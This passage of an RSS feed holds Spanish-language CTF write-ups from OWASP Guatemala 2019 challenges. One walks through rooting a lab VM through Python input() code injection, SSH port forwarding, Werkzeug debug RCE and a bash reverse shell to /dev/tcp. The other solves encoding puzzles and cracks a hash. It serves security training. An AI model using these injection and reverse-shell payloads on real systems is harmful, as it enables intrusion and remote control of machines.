&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-05-16 03:17 CDT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 192.168.1.21
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.000077s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.5p1 Ubuntu 10ubuntu0.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
5355/tcp  open  llmnr?
10000/tcp open  tcpwrapped
MAC Address: 00:0C:29:85:13:94 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;VMware&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 142.49 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;puerto-10000&#34;&gt;PUERTO 10000&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra2_1.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;netcat---puerto-10000&#34;&gt;NETCAT - PUERTO 10000&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra2_netcat.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;ejecutando-comandos---netcat-10000&#34;&gt;EJECUTANDO comandos - NETCAT 10000&lt;/h5&gt;
&lt;p&gt;&lt;a href=&#34;http://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html&#34;&gt;http://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html&lt;/a&gt;&lt;br /&gt;
Al pasarle una cadena de texto al &amp;lsquo;input&amp;rsquo; este lo evalua, si le pasamos la siguiente  linea de codigo &lt;code&gt;&amp;quot;__import__(&#39;os&#39;).system(&#39;id&#39;)&amp;quot;&lt;/code&gt; lo va ejecutar.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra2_netcat_python.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos unas credenciales, para poder verlas utilizamos &lt;code&gt;&amp;quot;__import__(&#39;os&#39;).system(&#39;cat credentials.txt&#39;)&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;credentials.txt&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;user: retoinfra2
password: 1337hackme!
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Nos logeamos por medio de SSH con las credenciales que encontramos.&lt;/p&gt;
&lt;p&gt;Encontramos el archivo ping que nos mostraba en el navegador:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;num_packets&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; Please enther number of packets: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;PING localhost (127.0.0.1) 56(84) bytes of data&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num_packets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;64 bytes from localhost (127.0.0.1): icmp_seq={} ttl=64 time=0.0{} ms&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tambien con nuestro archivo flag user y un hint:&lt;br /&gt;
&lt;code&gt;user.txt: flag{598852e2cd167e254ce4c5e95393c372}&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cat hint.txt 
Si estas leyendo esto felicidades, vas muy bien...
Para la elevacion de privilegios en esta maquina tiene que realizar port forwarding...

debug to rce werkzeug ....
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Revisamos los puertos con netstat -ntpl&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Active Internet connections &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;only servers&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:5355            0.0.0.0:*               LISTEN      -                   
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:10000           0.0.0.0:*               LISTEN      3740/socat          
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::5355                 :::*                    LISTEN      -                   
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      -
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Como lo dice el hint vamos a hacer port fordwarding del puerto 5000, lo vamos a traer a nuestra maquina local por medio de SSH.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -L 5656:127.0.0.1:5000 retoinfra2@192.168.1.21
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Revisamos localmente con netstat -tnpl y tenemos localmente el puerto 5000 en el puerto 5656 :).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/owasp/infra# netstat -ntpl
Active Internet connections &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;only servers&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:111             0.0.0.0:*               LISTEN      1/init              
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:5656          0.0.0.0:*               LISTEN      4456/ssh            
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::111                  :::*                    LISTEN      1/init              
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; ::1:5656                :::*                    LISTEN      4456/ssh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Como lo decia el hint, debug to rce werkzeug, encontramos un script que nos ayuda a ejecutar comandos en la maquina cuando esta activado &amp;ldquo;debug=True&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/its-arun/Werkzeug-Debug-RCE&#34;&gt;https://github.com/its-arun/Werkzeug-Debug-RCE&lt;/a&gt;&lt;br /&gt;
Ejecutamos el script y le pasamos la ip local con el puerto que trajimos con SSH tambien le pasamos un comando y eventualmente obtenemos la bandera root.txt&lt;br /&gt;
intra2_root.webp&lt;/p&gt;
&lt;p&gt;&lt;code&gt;root.txt: flag{8eab1e913f4a669eddbbd45c1484925a}&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;shell-root&#34;&gt;SHELL ROOT&lt;/h3&gt;
&lt;p&gt;Agregamos una shell inversa a un archivo sh en la carpeta del usuario que tenemos con bajos privilegios, para ejecutarlo como usuario root.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;retoinfra2@ubuntu:~$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.10/7878 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt; &amp;gt; shell.sh
retoinfra2@ubuntu:~$ &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
/home/retoinfra2
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Y por medio del script ejecutamos el archivo que contiene nuestra shell inversa y obtenemos una shell como root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/owaspinfra/intra2_root_shell.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;root.txt: flag{8eab1e913f4a669eddbbd45c1484925a}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;user.txt: flag{598852e2cd167e254ce4c5e95393c372}&lt;/code&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/owasp/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/owasp/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>challenge</category>
            
          
            
              <category>CTF</category>
            
          
            
              <category>windows</category>
            
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>owasp</category>
            
          
        
        
      </item>
      
      <item>
        <title>OWASP CTF 2019 Guatemala - Writeup</title>
        <link>https://sckull.github.io/posts/owasp2019/</link>
        <pubDate>Sun, 19 May 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sun, 19 May 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/owasp2019/</guid>
        <description>OWASP CTF es una serie de retos del OWASP Guatemala, aqui encontrarás la solucion para obtener las flags de los diferentes retos presentados por los organizadores.</description>
        <content:encoded>&lt;p&gt;OWASP CTF es una serie de retos del OWASP Guatemala, aqui encontrarás la solucion para obtener las flags de los diferentes retos presentados por los organizadores.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/owasp/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;br&gt;
&lt;hr /&gt;
&lt;p&gt;Aqui se listan algunas soluciones de los diferentes retos del CTF realizado en el OWASP Guatemala.&lt;/p&gt;
&lt;h1 id=&#34;scoreboard&#34;&gt;SCOREBOARD&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/1.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;trivia&#34;&gt;TRIVIA&lt;/h1&gt;
&lt;h2 id=&#34;dark-army&#34;&gt;Dark Army&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;whiterose&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;friends&#34;&gt;Friends&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;angela_moss&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;e-corp&#34;&gt;E-corp&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;flag{fsociety00.dat}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;fsociety&#34;&gt;Fsociety&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;mr robot&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;crypto&#34;&gt;CRYPTO&lt;/h1&gt;
&lt;h2 id=&#34;base&#34;&gt;BASE&lt;/h2&gt;
&lt;p&gt;Decodificamos el mensaje en base32.&lt;/p&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;MZWGCZ33MJQXGZJTGJPWS427OZSXE6K7MJXXEZLEEF6Q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;====&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;base32 -d
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;flag{base32_is_very_bored!}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;pi-pi-pi&#34;&gt;PI PI PI&lt;/h2&gt;
&lt;p&gt;Utilizando google buscamos una de las strings (&amp;ldquo;di-dah-dah&amp;rdquo;) y encontramos que es codigo morse utilizando di y dah que representan los sonidos. Codigo morse.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;dah-dah-dah di-dah-dah di-dah di-di-dit di-dah-dah-dit dah-dah-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit dah-dah-dah-dah-dit
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Escribí un pequeño script en python utilizando la tabla de valores descritos en la pagina(Codigo morse).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/pipi.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Codigo: &lt;a href=&#34;https://github.com/sckull/ctf-stuff/blob/master/morse_leng.py&#34;&gt;https://github.com/sckull/ctf-stuff/blob/master/morse_leng.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag: OWASP0123456789&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;brain&#34;&gt;BRAIN&lt;/h2&gt;
&lt;p&gt;Brainfuck es un lenguaje que se representa por medio de los caracteres &lt;code&gt;&amp;gt;&amp;lt;+-.,[]&lt;/code&gt; para obtener la flag se utilizo un decoder online. &lt;a href=&#34;https://www.dcode.fr/brainfuck-language&#34;&gt;https://www.dcode.fr/brainfuck-language&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;++++++++++[&amp;gt;+&amp;gt;+++&amp;gt;+++++++&amp;gt;++++++++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;-]&amp;gt;&amp;gt;&amp;gt;&amp;gt;++.++++++.-----------.++++++.++++++++++++++++++++.-------------------------.++++++++++++++++.-----------------.&amp;lt;&amp;lt;+++++++++++++++++++.&amp;gt;&amp;gt;+++++++++++++.--------.+++++++++++++++.------------------.++++++++.------------.++++++++++++++++++++++++.----------------------.++++++++++++++++++.--------------------.+++++++++.&amp;lt;&amp;lt;++.&amp;gt;&amp;gt;++++++++++.&amp;lt;&amp;lt;.&amp;gt;&amp;gt;+++++++++++.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/brainfuck.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{bra1nfuck_was_h3r3} &lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;htp&#34;&gt;HTP&lt;/h2&gt;
&lt;p&gt;Nos dan lo que parece una contraseña para poder obtener que tipo de hash es utilizamos hashcat, de igual forma para desencriptar la contraseña la misma herramienta.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Grecie:$apr1$9zQh77LH$cbQwfDnON90qz0mhYg1Yv.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://hashcat.net/wiki/doku.php?id=example_hashes&#34;&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/a&gt; [1600]&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/htp_1.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/htp_2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Decrypted:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;$apr1$9zQh77LH$cbQwfDnON90qz0mhYg1Yv.:classof08
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
